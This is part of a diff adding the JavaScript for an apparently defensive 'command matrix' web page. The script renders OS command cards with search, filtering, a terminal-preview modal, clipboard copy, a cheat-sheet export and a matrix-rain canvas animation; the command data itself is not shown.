+    let activeOSFilter = 'all';
+
+    // INITIALIZATION
+    window.onload = function() {
+      initMatrixCanvas();
+      startLiveClock();
+      renderMatrices();
+    };
+
+    // RENDER MATRIX CARDS
+    function renderMatrices() {
+      const macGrid = document.getElementById('grid-macos');
+      const winGrid = document.getElementById('grid-windows');
+      const linGrid = document.getElementById('grid-linux');
+
+      macGrid.innerHTML = '';
+      winGrid.innerHTML = '';
+      linGrid.innerHTML = '';
+
+      let visibleCount = 0;
+      const query = document.getElementById('search-input').value.toLowerCase().trim();
+
+      matrixData.forEach(item => {
+        // OS filter check
+        if (activeOSFilter !== 'all' && item.os !== activeOSFilter) {
+          return;
+        }
+
+        // Search Query Check
+        const searchTarget = `${item.target} ${item.tool} ${item.command} ${item.purpose}`.toLowerCase();
+        if (query && !searchTarget.includes(query)) {
+          return;
+        }
+
+        visibleCount++;
+
+        const cardHTML = createCardHTML(item);
+
+        if (item.os === 'macos') macGrid.innerHTML += cardHTML;
+        if (item.os === 'windows') winGrid.innerHTML += cardHTML;
+        if (item.os === 'linux') linGrid.innerHTML += cardHTML;
+      });
+
+      // Toggle OS Section Visibility
+      document.getElementById('section-macos').style.display = 
+        (activeOSFilter === 'all' || activeOSFilter === 'macos') && macGrid.children.length > 0 ? 'block' : 'none';
+      
+      document.getElementById('section-windows').style.display = 
+        (activeOSFilter === 'all' || activeOSFilter === 'windows') && winGrid.children.length > 0 ? 'block' : 'none';
+      
+      document.getElementById('section-linux').style.display = 
+        (activeOSFilter === 'all' || activeOSFilter === 'linux') && linGrid.children.length > 0 ? 'block' : 'none';
+
+      // No Results Message
+      const noResults = document.getElementById('no-results');
+      if (visibleCount === 0) {
+        noResults.classList.remove('hidden');
+      } else {
+        noResults.classList.add('hidden');
+      }
+
+      document.getElementById('cmd-count').innerText = `${visibleCount} Tools Active`;
+    }
+
+    // CREATE HTML FOR A SINGLE MATRIX ITEM
+    function createCardHTML(item) {
+      let osBadge = '';
+      if (item.os === 'macos') osBadge = '<span class="text-[10px] font-mono px-2 py-0.5 rounded bg-skyblue-500/20 text-skyblue-300 border border-skyblue-400/30"><i class="fa-brands fa-apple"></i> macOS</span>';
+      if (item.os === 'windows') osBadge = '<span class="text-[10px] font-mono px-2 py-0.5 rounded bg-skyblue-500/20 text-skyblue-400 border border-skyblue-400/30"><i class="fa-brands fa-windows"></i> Windows</span>';
+      if (item.os === 'linux') osBadge = '<span class="text-[10px] font-mono px-2 py-0.5 rounded bg-cyber-gold/20 text-cyber-gold border border-cyber-gold/30"><i class="fa-brands fa-linux"></i> Linux</span>';
+
+      return `
+        <div class="glass-card rounded-xl p-5 transition-all duration-300 hover:translate-y-[-2px]">
+          <div class="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
+            
+            <!-- Left Info -->
+            <div class="space-y-1.5 flex-1">
+              <div class="flex items-center gap-2">
+                ${osBadge}
+                <span class="text-xs font-mono font-bold text-cyber-gold uppercase tracking-wider">${item.target}</span>
+              </div>
+              <div class="flex items-center gap-2">
+                <span class="text-lg font-bold text-white font-mono glow-text-cyan">${item.tool}</span>
+              </div>
+              <p class="text-xs text-skyblue-100/90 leading-relaxed">${item.purpose}</p>
+            </div>
+
+            <!-- Command & Action Buttons -->
+            <div class="flex flex-col sm:flex-row items-stretch sm:items-center gap-3 lg:max-w-xl w-full">
+              <!-- Command Box -->
+              <div class="bg-skyblue-950/90 border border-skyblue-500/40 rounded-lg p-3 flex-1 flex items-center justify-between overflow-hidden group">
+                <code class="cmd-font text-xs text-white truncate font-medium pr-2">${escapeHTML(item.command)}</code>
+                <button onclick="copyToClipboard('${escapeJS(item.command)}')" class="text-xs text-skyblue-300 hover:text-white bg-skyblue-900/60 hover:bg-skyblue-700/60 p-1.5 rounded transition flex-shrink-0" title="Copy Command">
+                  <i class="fa-regular fa-copy"></i>
+                </button>
+              </div>
+
+              <!-- Terminal Simulation Launcher Button -->
+              <button onclick="openTerminalModal('${item.id}')" class="px-3 py-2 bg-skyblue-800/60 hover:bg-skyblue-700/80 border border-skyblue-400/40 text-skyblue-200 hover:text-white rounded-lg text-xs font-mono transition flex items-center justify-center gap-1.5 flex-shrink-0">
+                <i class="fa-solid fa-terminal text-cyber-gold"></i>
+                <span>Preview</span>
+              </button>
+            </div>
+
+          </div>
+        </div>
+      `;
+    }
+
+    // SEARCH & FILTER LOGIC
+    function filterCommands() {
+      const searchInput = document.getElementById('search-input');
+      const clearBtn = document.getElementById('clear-search-btn');
+      
+      if (searchInput.value.length > 0) {
+        clearBtn.classList.remove('hidden');
+      } else {
+        clearBtn.classList.add('hidden');
+      }
+
+      renderMatrices();
+    }
+
+    function clearSearch() {
+      const searchInput = document.getElementById('search-input');
+      searchInput.value = '';
+      document.getElementById('clear-search-btn').classList.add('hidden');
+      renderMatrices();
+    }
+
+    function setActiveOS(os) {
+      activeOSFilter = os;
+      document.querySelectorAll('.os-tab-btn').forEach(btn => {
+        btn.classList.remove('bg-skyblue-500', 'text-white', 'border-skyblue-300', 'active');
+        btn.classList.add('bg-skyblue-950/60', 'text-skyblue-100', 'border-skyblue-500/40');
+      });
+
+      const activeBtn = document.getElementById(`btn-tab-${os}`);
+      if (activeBtn) {
+        activeBtn.classList.remove('bg-skyblue-950/60', 'text-skyblue-100', 'border-skyblue-500/40');
+        activeBtn.classList.add('bg-skyblue-500', 'text-white', 'border-skyblue-300', 'active');
+      }
+
+      renderMatrices();
+    }
+
+    // TERMINAL MODAL PREVIEW
+    let currentModalCommand = '';
+
+    function openTerminalModal(itemId) {
+      const item = matrixData.find(d => d.id === itemId);
+      if (!item) return;
+
+      currentModalCommand = item.command;
+      document.getElementById('modal-tool').innerText = item.tool;
+      document.getElementById('modal-os').innerText = item.os.toUpperCase() + ' System';
+      document.getElementById('modal-cmd').innerText = item.command;
+      document.getElementById('modal-output').innerText = item.simulatedOutput;
+      document.getElementById('modal-tip').innerText = item.tip;
+
+      document.getElementById('terminal-modal').classList.remove('hidden');
+    }
+
+    function closeModal() {
+      document.getElementById('terminal-modal').classList.add('hidden');
+    }
+
+    function copyModalCommand() {
+      copyToClipboard(currentModalCommand);
+    }
+
+    // COPY TO CLIPBOARD
+    function copyToClipboard(text) {
+      if (navigator.clipboard && window.isSecureContext) {
+        navigator.clipboard.writeText(text).then(() => {
+          showToast("Command copied to clipboard!");
+        });
+      } else {
+        // Fallback for iFrame restrictions
+        const textArea = document.createElement("textarea");
+        textArea.value = text;
+        textArea.style.position = "fixed";
+        textArea.style.left = "-999999px";
+        document.body.appendChild(textArea);
+        textArea.focus();
+        textArea.select();
+        try {
+          document.execCommand('copy');
+          showToast("Command copied to clipboard!");
+        } catch (err) {
+          showToast("Failed to copy command.");
+        }
+        document.body.removeChild(textArea);
+      }
+    }
+
+    // TOAST NOTIFICATION
+    function showToast(message) {
+      const container = document.getElementById('toast-container');
+      const toast = document.createElement('div');
+      toast.className = "bg-skyblue-950 text-white font-mono text-xs px-4 py-3 rounded-lg border border-skyblue-400/60 shadow-xl flex items-center gap-2 transition-all duration-300 transform translate-y-2 opacity-0";
+      toast.innerHTML = `<i class="fa-solid fa-circle-check text-cyber-gold"></i><span>${message}</span>`;
+      
+      container.appendChild(toast);
+
+      setTimeout(() => {
+        toast.classList.remove('translate-y-2', 'opacity-0');
+      }, 10);
+
+      setTimeout(() => {
+        toast.classList.add('opacity-0');
+        setTimeout(() => toast.remove(), 300);
+      }, 2500);
+    }
+
+    // EXPORT DOWNLOAD CHEAT SHEET
+    function downloadCheatSheet() {
+      let content = `=================================================================\n`;
+      content += `       DIVINE CYBER DEFENSE - NATIVE COMMAND MATRIX CHEAT SHEET   \n`;
+      content += `                   "Soli Deo Gloria" - Ethical Cyber Hub          \n`;
+      content += `=================================================================\n\n`;
+
+      const categories = ['macos', 'windows', 'linux'];
+
+      categories.forEach(cat => {
+        content += `\n==================================\n`;
+        content += ` ${cat.toUpperCase()} NATIVE MATRIX \n`;
+        content += `==================================\n\n`;
+
+        matrixData.filter(d => d.os === cat).forEach((item, idx) => {
+          content += `[${idx + 1}] TARGET: ${item.target}\n`;
+          content += `    TOOL:   ${item.tool}\n`;
+          content += `    CMD:    ${item.command}\n`;
+          content += `    PURP:   ${item.purpose}\n`;
+          content += `    TIP:    ${item.tip}\n`;
+          content += `-----------------------------------------------------------------\n`;
+        });
+      });
+
+      const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'Divine_Cyber_Defense_Command_Matrix.txt';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+
+      showToast("Cheat Sheet Exported Successfully!");
+    }
+
+    // LIVE UTC CLOCK
+    function startLiveClock() {
+      function update() {
+        const now = new Date();
+        document.getElementById('live-clock').innerText = now.toUTCString().replace('GMT', 'UTC');
+      }
+      update();
+      setInterval(update, 1000);
+    }
+
+    // MATRIX CANVAS (SKY-BLUE DIVINE MATRIX EFFECT)
+    function initMatrixCanvas() {
+      const canvas = document.getElementById('matrix-canvas');
+      const ctx = canvas.getContext('2d');
+
+      function resize() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+      }
+      resize();
+      window.addEventListener('resize', resize);
+
+      const chars = "✝01010101010101010101ALPHA OMEGA DEFENSE TRUTH ETHICS SYSMON NETSTAT";
+      const fontSize = 14;
+      const columns = Math.floor(canvas.width / fontSize);
+      const drops = Array(columns).fill(1);
+
+      function draw() {
+        // Subtle dark sky-blue fade
+        ctx.fillStyle = 'rgba(3, 19, 41, 0.08)';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+        ctx.fillStyle = '#38bdf8'; // Sky-Blue Glowing Text
+        ctx.font = `${fontSize}px Fira Code, monospace`;
+
+        for (let i = 0; i < drops.length; i++) {
+          const text = chars.charAt(Math.floor(Math.random() * chars.length));
+          
+          // Occasional Golden Cross Character
+          if (text === '✝') {
+            ctx.fillStyle = '#fbbf24';
+          } else {
+            ctx.fillStyle = '#38bdf8';
+          }
+
+          ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+          if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+            drops[i] = 0;
+          }
+          drops[i]++;
+        }
+      }
+
+      setInterval(draw, 40);
+    }
+
+    // HELPER UTILS
+    function escapeHTML(str) {
+      return str.replace(/[&<>'"]/g, 
+        tag => ({
+          '&': '&amp;',
+          '<': '&lt;',
+          '>': '&gt;',
+          "'": '&#39;',
+          '"': '&quot;'
+        }[tag] || tag)
+      );
+    }
+
+    function escapeJS(str) {
+      return str.replace(/'/g, "\\'").replace(/"/g, '\\"');
+    }
+  </script>
+</body>
+</html>
